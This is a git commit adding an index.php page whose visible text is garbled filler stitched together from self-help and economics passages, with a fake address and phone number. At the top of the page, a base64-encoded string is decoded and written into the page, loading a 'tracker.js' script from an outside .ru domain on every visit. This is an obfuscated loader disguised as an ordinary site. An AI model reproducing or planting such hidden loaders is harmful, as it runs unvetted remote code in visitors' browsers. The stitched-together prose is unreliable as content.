1876c1f290dd8f5014c51bac1a09905437d965fd
mvsnhdhd <79412111+mvsnhdhd@users.noreply.github.com>
2021-02-21 17:40:24 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xeGhpYWtxMXJtbGpqNXRhYWsiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>These are mandatory fees,carried out by the state are called taxes.  The point i</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="0vjd088y1s3xxbdrbyrrz">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="hhraem7remlwnvevq">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>These are mandatory fees,carried out by the state are called taxes.  The point i</h1>
+	</section>
+
+
+	<section class="our-work" class="o7otygyz1nqac04r5nz14">
+		<h3 class="title">It is within your Circle of Influence.  The tension</h3>
+		<p>In 1992, we - two editors (of the Russian version) of this book - underwent special training and received the right to teach "Seven Habits" in Russia.Since that time, we have been able to acquaint hundreds of people with the teachings of Stephen Covey.  If the consumer does not care which combination he prefers, then he is in a position of indifference.  Instead, we spend all our time watching TV.  Thus, the functions of state bodies are a legal concept.  Therefore, you have to take the risk "upon yourself". </p>
+		<hr>
+
+		<ul class="grid" class="jv5o9wi8tkysgc8d8ks40pl">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="0vjd088y1s3xxbdrbyrrz">
+		<h3 class="title">- What will happen if you do not go? - Wel</h3>
+		<p>Ezra Taft Benson I want to share with you an episode from my life, which, in my opinion, expresses the essence of this book.  Inner orientation: Your orientations are determined by the desires and needs (yours and your spouse's).  And the skill of interpersonal leadership is Habit 4 - Think Win / Win.  As a result, the employee of a certain type of labor is able to use the products of any other specific type of labor; 2) specialization.  It is a theory, explanation, or model of something. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hhraem7remlwnvevq" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="o7otygyz1nqac04r5nz14">
+		<h3 class="title">When you are dealing with a person who has a Win / Lose paradig</h3>
+		<p>Unique human properties: self-awareness, imagination and conscience - give us the opportunity to analyze the first creation and take responsibility for creating it for ourselves, for writing our own script.  Once again, when you catch yourself inappropriately using autobiographical answers: elicitation, assessment, advice or interpretation, try to turn the situation into an Emotional Bank Account by admitting your mistake and apologizing.  “You have no idea what he did this time,” said one.  4.  2.  You tend to compare what you have with what others have.  - Well! We have decided on this. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="jv5o9wi8tkysgc8d8ks40pl" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="0vjd088y1s3xxbdrbyrrz">
+		<h3 class="title">There are situationswhen you are targeting the Win </h3>
+		<p>1.  Your normal work day begins, and you, looking through the list of upcoming tasks, calculate the time that each of them will take.  will shift the supply curve to the left.  She didn't even think about purchasing a product with a different brand! Even when we were just starting out and had a lot of financial constraints, Sandra insisted on a fifty-mile trip to the “big city,” where Frigidar merchandise was sold that were not available on our tiny campus.  Depending on the method of calculating wages with piece-rate pay, there are several forms of remuneration: 1) direct piece-rate, when workers are paid for the number of units of products they have made and work performed on the basis of fixed piece-rate rates; 2) piece-rate-progressive, in which the payment rises for the output above the norm;3) piece-rate bonus, when labor remuneration includes bonuses for overfulfillment of production standards, achievement of certain quality indicators: delivery of work from the first presentation, absence of defects, complaints, saving of materials.  I suspect that many of the problems they shared with me are familiar to you. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hhraem7remlwnvevq" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="o7otygyz1nqac04r5nz14">
+		<h3 class="title">This approach turns failure into success. </h3>
+		<p>- Why did you give him the first rank? I asked.  However, entertainment by itself does not bring deep, lasting satisfaction and a sense of fullness of life.  If we could make our choice again, our decision would be different.  As the scale of production changes, so does the long-term average cost.If, in any range of output, the long-term average costs decrease with an increase in output, then there is an economy (due to an increase in the scale of production).  Why do you think your people refuse to cooperate? What does it give them? What reward do they get for this? - It doesn't give them anything! There is no reward for lack of cooperation, the president assured me.  Book counters today abound in publications that teach methods of influencing people, the rules of talking on the phone,negotiation techniques, sales techniques, and so on.  It is very important for children to feel that they belong to the “family”, to feel that they are known and taken care of by many people, even if they live in different parts of the country.  Let's say you could ask this person's opinion about a project currently underway or a problem that has arisen, appreciating the likely difference from your point of view 2.Make a list of people who annoy you.  EMPLOYMENT AND UNEMPLOYMENT According to the structure, they distinguish sectoral, professional and qualification employment, as well as by sectors of the economy.  “I work as a nurse for the grumpiest and most ungrateful person you can imagine.  With this management, managers - the director, his deputies, the heads of production, workshops, sections,foremen and foremen are given full authority over subordinates.  And if the child is used to believing your words, he will heed your advice. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="jv5o9wi8tkysgc8d8ks40pl" class="title">As long as we communicated and interacted at the level of our o</h3>	
+		<p>Only heaven knows the real price for everything.  We enjoyed the golden eggs and the goose - the quality of our relationship - was well fed.  There may be circumstances in which synergy cannot be achieved and the Do Not Link situation is unacceptable.  Thus, the action of the price factor leads to a change in the amount of demand, which can be seen on the demand curve.  Imagine that there is a certain "climate" in your family - a certain level of positive or negative interaction,a certain level of protection or insecurity when expressing feelings or concerns, a certain level of respect or disrespect in communication between family members.  STAGES OF MARKETING RESEARCH The process of marketing research includes several stages.  And I asked: - Can I do something to help you? - Can you really help, dad? - How did we agree? “You said you'd help if you had time.  The scientific world was revolutionized by Einstein's paradigm of the theory of relativity, which was distinguished by significantly greater possibilities of prediction and explanation.  - Are you forced to go or have you decided to go? I asked.  And such a manufacturer buys everything that is missing himself on the market, in a store, etc.  Once I found myself in the company of several people, one of whom asked the question: - How do you influence lazy and incompetent employees? - I'm throwing a grenade at them! - someone answered. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="0vjd088y1s3xxbdrbyrrz">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="hhraem7remlwnvevq"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="o7otygyz1nqac04r5nz14"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="jv5o9wi8tkysgc8d8ks40pl"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>0574 Goyette Bypass, Apt. 127, 08941, Greenholtberg, North Dakota, United States</p>
+		<p>Phone number: +46(81)626-5907399</p>
+	</footer>
+
+</body>
+
+</html>
